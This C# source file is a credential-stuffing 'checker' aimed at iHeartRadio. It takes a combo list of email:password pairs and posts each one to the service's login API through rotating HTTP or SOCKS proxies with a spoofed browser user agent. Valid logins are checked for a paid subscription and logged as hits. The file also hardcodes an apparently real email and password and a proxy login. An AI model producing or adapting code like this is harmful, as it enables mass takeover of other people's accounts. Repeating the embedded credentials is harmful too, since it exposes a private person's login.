using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Checker_IheartRadio.Utils;
using Leaf.xNet;
using Newtonsoft.Json.Linq;
using Console = Colorful.Console;


namespace Checker_IheartRadio.Checker
{
    internal class Brute
    {

        public static void UpdateUI()
        {
            while(true)
            {
                Variables.CPM = Variables.CPMAux;
                Variables.CPMAux = 0;

                Console.Title = string.Format("[IheartRadio Checker]  - Checked: {0}/{1} - Hits: {2} - Invalid: {3} - Custom: {4} - Errors: {5} - Retries: {6} - CPM: ", new object[]
                {
                Variables.Checked,
                Variables.Total,
                Variables.Hits,
                Variables.Invalids,
                Variables.HitsFree,
                Variables.Errors,
                Variables.Retries
                }) + Variables.CPM * 60 + " - Coded by Vizz";
                Thread.Sleep(1000);
            }
            
        }
        public static void Checker()
        {
            while (true)
            {
                String profileId = "None";
                String sessionId = "None";
                if(Variables.ProxyIndex >= Variables.Proxies.Count<string>()-2)
                {
                    Variables.ProxyIndex = 0;
                }
                try
                {
                    Interlocked.Increment(ref Variables.ProxyIndex);
                    using (HttpRequest request = new HttpRequest())
                    {
                        if (Variables.AccIndex >= Variables.Combos.Count<string>())
                        {
                            Variables.Stop++;
                            break;
                        }
                        Interlocked.Increment(ref Variables.AccIndex);
                        string email = "dntsusa@aol.com";
                        string pass = "esteAban0786";

                        string[] credenciales = Variables.Combos[Variables.AccIndex].Split(new char[]
                        {
                            ';',
                            ':',
                            '|'
                        });
                        string combo = credenciales[0] + ":" + credenciales[1];
                        //credenciales[0] = email;
                        //credenciales[1] = pass;

                        try
                        {
                            switch (Variables.ProxyType)
                            {
                                case "HTTP":
                                    request.Proxy = HttpProxyClient.Parse(Variables.Proxies[Variables.ProxyIndex]);
                                    request.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    request.Proxy = Socks4ProxyClient.Parse(Variables.Proxies[Variables.ProxyIndex]);
                                    request.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    request.Proxy = Socks5ProxyClient.Parse(Variables.Proxies[Variables.ProxyIndex]);
                                    request.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            //request.Proxy = Socks5ProxyClient.Parse("172.65.64.100:6060:5qbmesqta6srmo5-country-us:xa12fa6c242y4dz\r\n");
                            //request.Proxy.ConnectTimeout = 5000;


                            String id_random = Utils.Functions.RandomStringId();
                            //Console.WriteLine("ID DE DISPOSITIVO GENERADO " + id_random);

                            request.IgnoreProtocolErrors = true;
                            request.KeepAlive = true;
                            request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36";
                            request.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(request.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));

                            //headers
                            request.AddHeader("Host", "us.api.iheart.com");
                            request.AddHeader("Origin", "https://www.iheart.com");
                            request.AddHeader("Referer", "https://www.iheart.com/");
                            request.AddHeader("X-Locale", "en-US");
                            request.AddHeader("X-hostName", "webapp.US");

                            String postdata = $"deviceId={id_random}&deviceName=web-desktop&host=webapp.US&password={credenciales[1]}&userName={credenciales[0]}";

                            HttpResponse response = request.Post("https://us.api.iheart.com/api/v1/account/login", postdata, "application/x-www-form-urlencoded");

                            String responseString = response.ToString();

                            //valida respuesta Ok del servidor
                            if (response.StatusCode == HttpStatusCode.OK)
                            {
                                //Console.WriteLine("Credenciales validas");
                                //Console.WriteLine(responseString);
                                //valida si la respuesta contiene el profileId
                                if (responseString.Contains("profileId"))
                                {
                                    Variables.CPMAux++;
                                    Variables.Checked++;
                                    Variables.GetLatestHit = combo;
                                    JObject jsonObj = JObject.Parse(responseString);
                                    profileId = jsonObj["profileId"].ToString();
                                    sessionId = jsonObj["sessionId"].ToString();

                                    request.AddHeader("X-Session-Id", sessionId);
                                    request.AddHeader("X-Ihr-Session-Id", sessionId);
                                    request.AddHeader("X-Ihr-Profile-Id", profileId);
                                    request.AddHeader("X-User-Id", profileId);

                                    HttpResponse responseCaptureData = request.Get("https://us.api.iheart.com/api/v3/locationConfig?countryCode=US&hostname=webapp&version=8-prod");
                                    if (responseCaptureData.StatusCode == HttpStatusCode.OK)
                                    {
                                        string responseCaptureDataString = responseCaptureData.ToString();
                                        //Console.WriteLine(responseCaptureData);
                                        JObject captureData = JObject.Parse(responseCaptureDataString);
                                        //Console.WriteLine(captureData);
                                        JObject suscriptionObj = (JObject)captureData["subscription"];
                                        //Console.WriteLine(suscriptionObj);
                                        String subscriptionType = (string)suscriptionObj["subscriptionType"];
                                        String subscriptionSource = (string)suscriptionObj["source"];

                                        if(subscriptionType != "FREE") 
                                        {
                                            Console.WriteLine($" > [ SUCESS ] {combo}", Color.Green);
                                            Variables.Hits++;
                                        }
                                        else
                                        {
                                            Console.WriteLine($" > [ FREE ] {combo}", Color.Orange);
                                            Variables.HitsFree++;
                                        }
                                        //Console.WriteLine("Subscription: " + subscriptionType);
                                        //Console.WriteLine("Source: " + subscriptionSource);

                                    }
                                    else
                                    {
                                        //Console.WriteLine("Error al capturar datos");
                                    }

                                }
                                //Console.WriteLine("Profile ID: " + profileId);
                                //Console.WriteLine("Session ID: " + sessionId);
                            }
                            else if(response.StatusCode == HttpStatusCode.BadRequest)
                            {
                                Variables.CPMAux++;
                                Variables.Checked++;
                                Variables.Invalids++;
                                Console.WriteLine($" > [ FAIL ] {combo}", Color.Red);
                            }
                        }
                        catch
                        {
                            Variables.Combos.Add(combo);
                            Variables.Retries++;
                        }

                    }

                }
                catch (Exception ex)
                {
                    //Console.WriteLine(ex.Message);
                    //Console.WriteLine(ex.StackTrace);
                    Interlocked.Increment(ref Variables.Errors);
                    continue;
                }
            }
            //Evitar que el programa se cierre
            //Console.WriteLine("Enter para cerrar");
            //Console.ReadKey();
        }
    }
}
